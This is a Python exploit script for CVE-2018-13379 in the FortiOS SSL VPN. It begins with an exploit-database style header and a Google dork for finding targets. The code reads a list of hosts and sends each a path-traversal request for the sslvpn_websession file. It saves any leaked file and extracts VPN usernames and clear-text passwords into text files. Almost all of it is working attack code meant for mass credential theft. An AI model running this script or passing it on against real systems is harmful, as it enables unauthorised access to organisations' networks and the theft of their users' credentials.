# Changed a few things to my likings and it wasn't working for me at start (k4nfr3)
# https://github.com/k4nfr3/CVE-2018-13379-Fortinet/blob/main/cve-2018-13379.py
#
# Exploit Title: FortiOS Leak file - Reading login/passwords in clear text.
# Google Dork: intext:"Please Login" inurl:"/remote/login"
# Date: 17/08/2019
# Exploit Author: Carlos E. Vieira
# Vendor Homepage: https://www.fortinet.com/
# Software Link: https://www.fortinet.com/products/fortigate/fortios.html
# Version: This vulnerability affect ( FortiOS 5.6.3 to 5.6.7 and FortiOS 6.0.0 to 6.0.4 ).
# Tested on: 5.6.6
# CVE : CVE-2018-13379

# Exploit SSLVPN Fortinet - FortiOs
#
# It takes a INPUT file where each line is a host
# Output is on screen and files (raw and extracted username password in txt file)
#
#
# !/usr/bin/env python
# -*- coding: utf-8 -*-

import requests, sys, time
import urllib3
import re

urllib3.disable_warnings()

def leak(host, port):
    print("[!] Leak information...")
    try:
        url = "https://" + host + ":" + port + "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
        headers = {"User-Agent": "Mozilla/5.0",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                   "Upgrade-Insecure-Requests": "1"}
        r = requests.get(url, headers=headers, verify=False, stream=True)
        img = r.raw.read()
        if "var fgt_lang =" in str(img):
            with open("sslvpn_websession_" + host + ".dat", 'wb') as f:
                f.write(img)
            print("[>] Save to file ....")
            out = parse(host)
            with open("sslvpn_websession_" + host + ".txt", 'w') as f2:
                f2.write(out)
            print("\n")
            return True
        else:
            return False
    except requests.exceptions.ConnectionError:
        return False


def is_character_printable(s):
    if (s < 127) and (s >= 32):
        return True
    else :
        return False


def is_printable(byte):
    if is_character_printable(byte):
        #print(chr(byte))
        return chr(byte)
    else:
        return '_'


def read_bytes(host, chunksize=8192):
    print("[>] Read bytes from > " + "sslvpn_websession" + host + ".dat")
    with open("sslvpn_websession_" + host + ".dat", "rb") as f:
        while True:
            chunk = f.read(chunksize)
            if chunk:
                for b in chunk:
                    yield b
            else:
                break

def printentry(mystring):
    to_remove = "_"
    pattern = "(?P<char>[" + re.escape(to_remove) + "])(?P=char)+"
    cleaned = re.sub(pattern, r"\1", mystring)
    out = ("[$] "+" ".join(cleaned.split("_")[1:]))
    print(out)
    return out

def printout(final):
    output=''
    ips = re.findall("\B(?:[0-9]{1,3}\.){3}[0-9]{1,3}\B", final, flags=re.MULTILINE)
    start=0
    for ip in ips:
        n = len(ip)
        for i in range(len(final[start:])) :
            if final[i:i+n] == ip :
                start=i
                printentry(final[i:i+215])
                output+="\n"+ printentry(final[i:i+215])
    return output

def parse(host):
    final=''
    print("[!] Parsing Information...")
    memory_address = 0
    ascii_string = ""
    for byte in read_bytes(host):
        ascii_string = ascii_string + is_printable(byte)
        if memory_address % 61 == 60:
            #if ascii_string != ".............................................................":
            if ascii_string != "_____________________________________________________________":
                #print(ascii_string)
                final += ascii_string
            ascii_string = ""
        memory_address = memory_address + 1
    print("[!] Extracting username and passwords")
    print("")
    return printout(final)


def check(host, port):
    print("[!] Check vuln...")
    uri = "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
    try:
        r = requests.get("https://" + host + ":" + port + uri, verify=False)
        if (r.status_code == 200):
            return True
        elif (r.status_code == 404):
            return False
        else:
            return False
    except:
        print("Exception")
        return False


def main(hostname, myport):
    print("[+] Start exploiting...." + hostname + ":"+str(myport))
    vuln = check(hostname, myport)
    if (vuln):
        print("[+] "+hostname+" is VULNERABLE!")
        bin_file = leak(hostname, myport)
    else:
        print("[X] "+hostname+" is not vulnerable.")


if __name__ == "__main__":
    if (len(sys.argv) < 2):
        print("Use: python {} iplistfile".format(sys.argv[0]))
    else:
        file = open(sys.argv[1], 'r')
        mylist = file.readlines()
        for host in mylist:
            main(host.strip(), str(10443))  #hardcoded port number
